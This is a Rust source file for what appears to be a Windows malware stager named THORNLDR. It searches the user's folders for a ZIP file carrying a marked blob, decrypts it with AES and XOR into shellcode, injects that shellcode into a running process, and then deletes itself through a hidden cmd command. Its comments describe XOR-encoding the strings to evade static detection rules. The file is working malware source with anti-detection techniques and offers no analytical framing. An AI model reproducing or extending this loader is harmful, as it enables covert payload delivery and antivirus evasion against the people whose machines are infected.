mod api_hash;
mod config;
mod dynload;
mod injection;
mod peb_walk;
mod syscall;
mod target_select;
mod utils;

use aes::Aes256;
use cbc::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
use std::os::windows::process::CommandExt;

type Aes256CbcDec = cbc::Decryptor<Aes256>;
const CREATE_NO_WINDOW: u32 = 0x0800_0000;

/// Decode a THORNLDR blob that contains a per-build XOR decoder stub.
/// See direct_exec/main.rs for full explanation.
fn decode_blob(encrypted: &[u8]) -> Vec<u8> {
    if encrypted.len() < 56 || encrypted[0] != 0xEB || encrypted[1] != 0x0E {
        return encrypted.to_vec();
    }
    let xor_key   = encrypted[45];
    let pe_offset = u32::from_le_bytes(encrypted[8..12].try_into().unwrap_or([0; 4])) as usize;
    let pe_size   = u32::from_le_bytes(encrypted[12..16].try_into().unwrap_or([0; 4])) as usize;
    let decode_end = pe_offset.saturating_add(pe_size);

    let mut blob = encrypted.to_vec();
    if decode_end <= blob.len() {
        for b in &mut blob[56..decode_end] {
            *b ^= xor_key;
        }
    }
    // Patch JMP: EB 0E (→ decoder) → EB 36 (→ stub at offset 56 directly).
    blob[1] = 0x36;
    blob
}

// XOR key for runtime string decoding. Different from dynload's 0x5A on
// purpose — keeping literals out of .rdata is cheap insurance, but using the
// same byte everywhere creates a recognisable pattern for static rules.
const STR_KEY: u8 = 0x37;

#[inline(never)]
fn xor_decode(enc: &[u8]) -> String {
    let bytes: Vec<u8> = enc.iter().map(|b| b ^ STR_KEY).collect();
    String::from_utf8(bytes).unwrap_or_default()
}

fn self_delete() {
    // "ping -n 3 127.0.0.1 >nul && del /f /q \"{}\"" XORed with STR_KEY.
    // Kept out of .rdata to avoid static rules that key on the classic
    // ping+del self-delete pattern.
    const CMD_TEMPLATE: &[u8] = &[
        0x47, 0x5e, 0x59, 0x50, 0x17, 0x1a, 0x59, 0x17, 0x04, 0x17, 0x06,
        0x05, 0x00, 0x19, 0x07, 0x19, 0x07, 0x19, 0x06, 0x17, 0x09, 0x18,
        0x53, 0x52, 0x41, 0x18, 0x59, 0x42, 0x5b, 0x5b, 0x17, 0x11, 0x11,
        0x17, 0x53, 0x52, 0x5b, 0x17, 0x18, 0x51, 0x17, 0x18, 0x46, 0x17,
        0x15, 0x4c, 0x4a, 0x15,
    ];
    const CMD_EXE: &[u8] = &[0x54, 0x5a, 0x53];  // "cmd"
    const SLASH_C: &[u8] = &[0x18, 0x54];        // "/c"

    if let Ok(path) = std::env::current_exe() {
        let template = xor_decode(CMD_TEMPLATE);
        let cmd      = template.replace("{}", &path.display().to_string());
        let _ = std::process::Command::new(xor_decode(CMD_EXE))
            .args([xor_decode(SLASH_C), cmd])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
    }
}

fn main() {
    // Search common user directories for a ZIP containing the THORNPLD blob.
    let mut search_dirs: Vec<std::path::PathBuf> = Vec::new();
    if let Ok(profile) = std::env::var("USERPROFILE") {
        let base = std::path::PathBuf::from(&profile);
        search_dirs.push(base.join("Downloads"));
        search_dirs.push(base.join("Desktop"));
        search_dirs.push(base.join("Documents"));
    }
    if let Ok(tmp) = std::env::var("TEMP") {
        search_dirs.push(std::path::PathBuf::from(tmp));
    }
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            search_dirs.push(dir.to_path_buf());
        }
    }

    let zip_candidates: Vec<std::path::PathBuf> = search_dirs.iter()
        .filter_map(|dir| std::fs::read_dir(dir).ok())
        .flat_map(|entries| entries.filter_map(|e| e.ok()).map(|e| e.path()))
        .filter(|p| p.extension().and_then(|x| x.to_str()) == Some("zip"))
        .collect();

    // "THORNPLD" XOR-encoded with STR_KEY so the literal magic does not appear
    // in .rdata. Decoded to a stack buffer at runtime — wrapped in black_box so
    // LTO cannot const-fold the XOR back to the plaintext literal.
    const MAGIC_ENC: [u8; 8] = [0x63, 0x7f, 0x78, 0x65, 0x79, 0x67, 0x7b, 0x73];
    let enc = std::hint::black_box(MAGIC_ENC);
    let mut magic = [0u8; 8];
    for i in 0..8 {
        magic[i] = enc[i] ^ std::hint::black_box(STR_KEY);
    }
    let (zip_bytes, pos) = match zip_candidates.iter()
        .filter_map(|p| std::fs::read(p).ok())
        .find_map(|bytes| {
            bytes.windows(8).position(|w| w == magic).map(|pos| (bytes, pos))
        })
    {
        Some(pair) => pair,
        None       => return,
    };

    let len       = u32::from_le_bytes(zip_bytes[pos+8..pos+12].try_into().unwrap_or([0;4])) as usize;
    let encrypted = &zip_bytes[pos+12..pos+12+len];
    let (key, iv) = unsafe { (config::STAGER_CONFIG.key(), config::STAGER_CONFIG.iv()) };
    let mut dec_buf = encrypted.to_vec();
    let shellcode = match Aes256CbcDec::new(key.into(), iv.into())
        .decrypt_padded_mut::<Pkcs7>(&mut dec_buf)
    {
        Ok(sc) => decode_blob(sc),
        Err(_) => return,
    };

    // target_select picks the best running process; no process spawning, no PPID spoofing.
    if injection::inject(&shellcode).is_err() {
        return;
    }

    self_delete();
}
